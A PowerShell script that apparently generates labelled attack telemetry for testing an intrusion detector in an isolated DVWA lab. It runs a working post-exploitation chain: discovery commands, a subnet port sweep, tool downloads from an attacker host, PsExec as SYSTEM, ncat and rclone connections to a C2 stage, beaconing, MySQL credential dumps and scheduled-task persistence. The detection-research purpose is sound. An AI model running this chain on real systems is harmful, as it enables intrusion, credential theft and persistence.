<#
  rce-killchain.ps1 - the demo's ONE attack (replaces the old 01..10 scenarios).

  Runs ON the Windows target as a child of the RCE shell (httpd.exe -> cmd.exe -> powershell -> this
  script), which is exactly the anomalous provenance OCR-APT should flag. It does NOT exploit anything
  itself: the Kali attacker (tools/launch_exploit.py) exploits DVWA and delivers this script as the
  stage. See SCENARIOS.md for the phase/ATT&CK table and README.md for the run recipe.

  Realistic post-exploitation chain (user, 2026-11-04 - deliberately high-volume so the attack stands
  out from the idle baseline on its own, without any detector-side weighting):
    Initial access / execution ... T1190 + T1059.001  (the delivery; marked only)
    Discovery .................... T1033 T1082 T1057 T1016
    Network service scan ......... T1046              (loud subnet sweep -> many NET nodes)
    Ingress tool transfer ........ T1105              (download several INERT markers named like tools)
    Credential access / DB ....... T1552 / T1213      (MySQL as root/no-password: enumerate + dump, READ-ONLY)
    C2 beacon .................... T1071              (periodic callback; loops to sustain >= DurationSeconds)
    Persistence .................. T1053.005          (scheduled task)

  EVERYTHING is lab-only and benign: the "tools" are inert marker files (not real binaries), the DB
  phase is read-only enumeration of the lab's own DVWA DB, and the scan targets the isolated lab subnets.
  Each step self-logs a ground-truth record via Write-AttackLabel (lib\attack-lib.ps1), the label oracle
  joined to the graph (LABELING.md, DEVIATIONS D6).

  PowerShell notes for the reader: "param(...)" = named flags; "[switch]$X" = boolean flag; a
  "-Action { ... }" scriptblock is a lambda the helper times and labels; "$($h):$p" avoids PowerShell
  reading "$h:" as a scope qualifier.
#>
param(
    # Where this script fetched its stage from (the Kali attacker). The launcher substitutes these;
    # defaults keep a manual run on the VM working. ${attacker}:${StagePort} is the T1105/C2 endpoint.
    [string]$Attacker  = $(if ($env:LAB_ATTACKER)   { $env:LAB_ATTACKER }   else { "10.21.4.30" }),
    [int]   $StagePort = $(if ($env:LAB_STAGE_PORT) { [int]$env:LAB_STAGE_PORT } else { 8080 }),
    # Sustain the attack for this many seconds by looping the C2 beacon + DB bursts (scan/tool-download
    # run once). 0 = single pass (manual default). The launcher sets it from --attack-seconds via
    # $env:LAB_DURATION_SECONDS. [OURS], not from the paper.
    [int]   $DurationSeconds = $(if ($env:LAB_DURATION_SECONDS) { [int]$env:LAB_DURATION_SECONDS } else { 0 }),
    [switch]$SelfTest   # dry run: stub the actions, prove one well-formed label line is written, exit 0.
)

# Reuse the canonical helpers. When delivered as the combined stage (iex), they are already in scope;
# when run by hand from the pack on the VM, dot-source them.
if (-not (Get-Command Write-AttackLabel -ErrorAction SilentlyContinue)) {
    . "$PSScriptRoot\..\lib\attack-lib.ps1"
}

if ($SelfTest) {
    # Prove-it-runs only (CLAUDE section 6): temporary label file, stubbed actions, check the JSONL shape.
    # Contacts nothing: no scan, no download, no DB.
    $tmp = Join-Path ([System.IO.Path]::GetTempPath()) ("rce-selftest-{0}.jsonl" -f ([guid]::NewGuid()))
    Initialize-AttackLab -LabelFile $tmp
    Write-AttackLabel -Technique "T1082" -Tactic "discovery" `
        -Start ([DateTime]::UtcNow) -End ([DateTime]::UtcNow) `
        -ProcessIndicators @("systeminfo.exe") -Note "selftest" -Source "custom"
    $line = Get-Content $tmp -First 1 | ConvertFrom-Json
    Remove-Item $tmp -Force -ErrorAction SilentlyContinue
    if ($line.technique -eq "T1082" -and $line.malicious -eq $true) {
        Write-Host "[selftest] OK - label record well-formed" -ForegroundColor Green; exit 0
    } else { Write-Error "[selftest] FAIL - bad label record"; exit 1 }
}

Initialize-AttackLab   # labels -> C:\lab-labels\attack-labels.jsonl, host SimulatedW10
$stageBase  = "http://$($Attacker):$($StagePort)"
$toolsDir   = "C:\Users\Public\tools"            # where the downloaded tool markers land
$legacyTool = "C:\Users\Public\downloaded_tool.bin"
$taskName   = "UpdaterSync"                        # persistence artefact; cleanup-all.ps1 deletes this name
$mysql      = "C:\xampp\mysql\bin\mysql.exe"       # XAMPP MariaDB client (DVWA backend)
# Real benign tool binaries downloaded from the Kali stage and EXECUTED below (the signal is the tool's
# process + sockets, not file content). When the stage only has a marker, the download still writes a file
# and the exec is skipped gracefully. Keep in sync with TOOL_NAMES in tools/launch_exploit.py.
$toolNames  = @("nmap.exe","ncat.exe","PsExec64.exe","rclone.exe")
# Loud internal scan targets: the lab subnet + the Kali box, common service ports.
$scanHosts  = (1..50 | ForEach-Object { "10.21.3.$_" }) + @("10.21.4.30")
$scanPorts  = 22,80,443,445,3306,3389,8000

# Run a staged tool with a HARD timeout so a hung or absent binary never stalls the chain. Only executes
# a REAL PE (file starts with 'MZ'); a served inert marker (text) is detected and the exec is skipped.
# $ToolArgs is passed verbatim. Returns $true if the process was started.
function Invoke-ToolWithTimeout {
    param([string]$Path, [string[]]$ToolArgs = @(), [int]$TimeoutSec = 30)
    if (-not (Test-Path $Path)) { Write-Warning "tool missing: $Path (skip)"; return $false }
    try {
        $fs = [System.IO.File]::OpenRead($Path)
        $b0 = $fs.ReadByte(); $b1 = $fs.ReadByte(); $fs.Close()
        if ($b0 -ne 0x4D -or $b1 -ne 0x5A) { Write-Warning "marker not a real binary: $Path (skip exec)"; return $false }
    } catch { return $false }
    try {
        $sp = @{ FilePath = $Path; NoNewWindow = $true; PassThru = $true }
        if ($ToolArgs.Count -gt 0) { $sp.ArgumentList = $ToolArgs }
        $p = Start-Process @sp
        if (-not $p.WaitForExit($TimeoutSec * 1000)) {
            try { $p.Kill() } catch {}
            Write-Warning "tool timed out after ${TimeoutSec}s: $Path (killed)"
        }
        return $true
    } catch { Write-Warning "tool failed: $Path - $($_.Exception.Message)"; return $false }
}

# READ-ONLY MySQL enumeration + credential dump (root has no password = the lab default, unsecured creds).
# Each `& $mysql` is a short-lived mysql.exe child + a 127.0.0.1:3306 connection. No writes -> no cleanup.
function Invoke-DbBurst {
    param([string]$Note = "MySQL enumeration + credential dump (root, no password)")
    if (-not (Test-Path $mysql)) {
        Write-Warning "mysql client not found ($mysql) - skipping DB phase (not on the vulnlab host)"
        return
    }
    Invoke-LabeledStep -Technique "T1552" -Tactic "credential-access" `
        -ProcessIndicators @("mysql.exe") `
        -NetworkIndicators @("127.0.0.1:3306") `
        -Note $Note -Action {
            & $mysql -uroot -N -e "SHOW DATABASES;" 2>$null | Out-Null
            & $mysql -uroot -N -e "SHOW TABLES FROM dvwa;" 2>$null | Out-Null
            & $mysql -uroot -N -e "SELECT user,password FROM dvwa.users;" 2>$null | Out-Null        # dump app creds
            & $mysql -uroot -N -e "SELECT user,authentication_string FROM mysql.user;" 2>$null | Out-Null
            & $mysql -uroot -N -e "SELECT table_schema,table_name FROM information_schema.tables;" 2>$null | Out-Null
        }
}

Write-Host "[rce] killchain starting; stage/C2 = $stageBase; duration = ${DurationSeconds}s" -ForegroundColor Magenta
$deadline = (Get-Date).AddSeconds($DurationSeconds)   # total attack targets ~DurationSeconds (beacon loop fills the rest)

# --- Initial access marker (the real exec is the delivery that launched this script) ----------------
# httpd.exe is DVWA's Apache; cmd.exe runs the injected command (shell_exec, security=low); powershell is
# the staged child.
Write-AttackLabel -Technique "T1190" -Tactic "initial-access" `
    -Start ([DateTime]::UtcNow) -End ([DateTime]::UtcNow) `
    -ProcessIndicators @("httpd.exe","cmd.exe","powershell.exe") `
    -NetworkIndicators @("$($Attacker):$StagePort") `
    -Note "Exploit public-facing app (DVWA, OS command injection) -> RCE; T1059.001 PowerShell stage" -Source "custom"

# --- Discovery (several short-lived processes, all children of this shell) ---------------------------
Invoke-LabeledStep -Technique "T1033" -Tactic "discovery" `
    -ProcessIndicators @("whoami.exe") -Note "System owner/user" -Action {
        & whoami /all | Out-Null
    }
Invoke-LabeledStep -Technique "T1082" -Tactic "discovery" `
    -ProcessIndicators @("systeminfo.exe","hostname.exe") -Note "System information" -Action {
        & systeminfo | Out-Null; & hostname | Out-Null
    }
Invoke-LabeledStep -Technique "T1057" -Tactic "discovery" `
    -ProcessIndicators @("tasklist.exe") -Note "Process discovery" -Action {
        & tasklist | Out-Null
    }
Invoke-LabeledStep -Technique "T1016" -Tactic "discovery" `
    -ProcessIndicators @("ipconfig.exe","netstat.exe","net.exe") -Note "Network config + connections" -Action {
        & ipconfig /all | Out-Null; & netstat -ano | Out-Null; & net user | Out-Null
    }

# --- T1046 Network service scan: loud subnet sweep -> a distinct NET node per ip:port (the big signal) --
Invoke-LabeledStep -Technique "T1046" -Tactic "discovery" `
    -ProcessIndicators @("powershell.exe") `
    -NetworkIndicators @("10.21.3.0/24","10.21.4.30") `
    -Note "Internal network service scan ($($scanHosts.Count) hosts x $($scanPorts.Count) ports)" -Action {
        foreach ($h in $scanHosts) {
            foreach ($p in $scanPorts) {
                $c = New-Object System.Net.Sockets.TcpClient
                try { $ar = $c.BeginConnect($h, $p, $null, $null); [void]$ar.AsyncWaitHandle.WaitOne(150) }
                catch {} finally { $c.Close() }
            }
        }
    }

# --- T1105 Ingress tool transfer: download several INERT markers named like hacker tools ------------
Invoke-LabeledStep -Technique "T1105" -Tactic "command-and-control" `
    -ProcessIndicators @("powershell.exe") `
    -FileIndicators (@($legacyTool) + ($toolNames | ForEach-Object { "$toolsDir\$_" })) `
    -NetworkIndicators @("$($Attacker):$StagePort") `
    -Note "Download tooling (inert lab markers) from the attacker stage" -Action {
        New-Item -ItemType Directory -Force -Path $toolsDir | Out-Null
        $ProgressPreference = 'SilentlyContinue'   # the IWR progress bar cripples large-file throughput
        foreach ($t in $toolNames) {
            # 90 s: a real tool binary (e.g. rclone ~85 MB) is larger than the old marker.
            try { Invoke-WebRequest -Uri "$stageBase/$t" -OutFile (Join-Path $toolsDir $t) -UseBasicParsing -TimeoutSec 90 }
            catch { Write-Warning "download $t failed - the connection attempt still produced NET telemetry" }
        }
        try { Invoke-WebRequest -Uri "$stageBase/tool.bin" -OutFile $legacyTool -UseBasicParsing -TimeoutSec 10 } catch {}
    }

# --- Execute the downloaded tools (the real signal: new unseen tool PROCESS + socket nodes) ----------
# Each exec is timeout-guarded (Invoke-ToolWithTimeout) and runs ONLY if the download delivered a real PE
# (a served marker is detected and skipped), so the chain never hangs or fails on a missing/marker tool.

# PsExec as SYSTEM -> PsExec64.exe -> PSEXESVC.exe -> cmd.exe -> whoami.exe (a distinctive unseen tree).
Invoke-LabeledStep -Technique "T1569.002" -Tactic "execution" `
    -ProcessIndicators @("PsExec64.exe","PSEXESVC.exe","cmd.exe","whoami.exe") `
    -Note "Run PsExec as SYSTEM (service exec) -> whoami" -Action {
        Invoke-ToolWithTimeout -Path "$toolsDir\PsExec64.exe" `
            -ToolArgs @("-accepteula","-nobanner","-s","cmd","/c","whoami") -TimeoutSec 30 | Out-Null
    }

# rclone pulls a file from the C2 stage (copyurl) -> unseen rclone.exe process + a NET fetch to the C2.
Invoke-LabeledStep -Technique "T1105" -Tactic "command-and-control" `
    -ProcessIndicators @("rclone.exe") `
    -FileIndicators @("$toolsDir\pulled.bin") `
    -NetworkIndicators @("$($Attacker):$StagePort") `
    -Note "Run rclone copyurl to pull from the C2 stage" -Action {
        Invoke-ToolWithTimeout -Path "$toolsDir\rclone.exe" `
            -ToolArgs @("copyurl","$stageBase/tool.bin","$toolsDir\pulled.bin") -TimeoutSec 30 | Out-Null
    }

# Real nmap connect scan (best-effort; the TcpClient sweep above already carried the NET breadth). -sT -Pn
# needs no Npcap driver. Skipped automatically if nmap.exe was not staged (marker -> no exec).
Invoke-LabeledStep -Technique "T1046" -Tactic "discovery" `
    -ProcessIndicators @("nmap.exe") `
    -NetworkIndicators @("10.21.3.0/24","10.21.4.30") `
    -Note "Real nmap -sT connect scan (best-effort)" -Action {
        Invoke-ToolWithTimeout -Path "$toolsDir\nmap.exe" `
            -ToolArgs @("-sT","-Pn","-n","--host-timeout","5s","-p","22,80,443,445,3306,3389,8000",
                        "10.21.3.1-50","10.21.4.30") -TimeoutSec 120 | Out-Null
    }

# Real ncat connect to the C2 (best-effort; skipped if ncat.exe was not staged).
Invoke-LabeledStep -Technique "T1071" -Tactic "command-and-control" `
    -ProcessIndicators @("ncat.exe") `
    -NetworkIndicators @("$($Attacker):$StagePort") `
    -Note "Real ncat connect to the C2 (best-effort)" -Action {
        Invoke-ToolWithTimeout -Path "$toolsDir\ncat.exe" `
            -ToolArgs @("--recv-only","-w","3",$Attacker,"$StagePort") -TimeoutSec 15 | Out-Null
    }

# --- MySQL attack (read-only enumeration + credential dump) -----------------------------------------
Invoke-DbBurst -Note "Initial MySQL enumeration + credential dump (unsecured root)"

# --- T1071 C2 beacon + repeat DB bursts, looped to sustain >= DurationSeconds -----------------------
$beaconN = 0
while ($DurationSeconds -gt 0 -and (Get-Date) -lt $deadline) {
    $beaconN++
    Invoke-LabeledStep -Technique "T1071" -Tactic "command-and-control" `
        -ProcessIndicators @("powershell.exe") `
        -NetworkIndicators @("$($Attacker):$StagePort") `
        -Note "C2 beacon #$beaconN to the attacker stage" -Action {
            try { Invoke-WebRequest -Uri "$stageBase/beacon" -UseBasicParsing -TimeoutSec 5 | Out-Null } catch {}
        }
    Invoke-DbBurst -Note "Beaconed MySQL query burst #$beaconN"
    if ((Get-Date) -lt $deadline) { Start-Sleep -Seconds 15 }
}

# --- Persistence (T1053.005): scheduled task that runs a downloaded marker (once) -------------------
Invoke-LabeledStep -Technique "T1053.005" -Tactic "persistence" `
    -ProcessIndicators @("schtasks.exe") `
    -FileIndicators @($legacyTool,"C:\Windows\System32\Tasks\$taskName") `
    -Note "Scheduled task persistence ($taskName)" -Action {
        & schtasks /create /tn $taskName /tr "cmd /c `"$legacyTool`"" /sc minute /mo 5 /f | Out-Null
    }

Write-Host "[rce] killchain complete. Labels appended to C:\lab-labels\attack-labels.jsonl" -ForegroundColor Magenta
Write-Host "[rce] reset with cleanup-all.ps1 (or restore the VM snapshot)." -ForegroundColor DarkGray
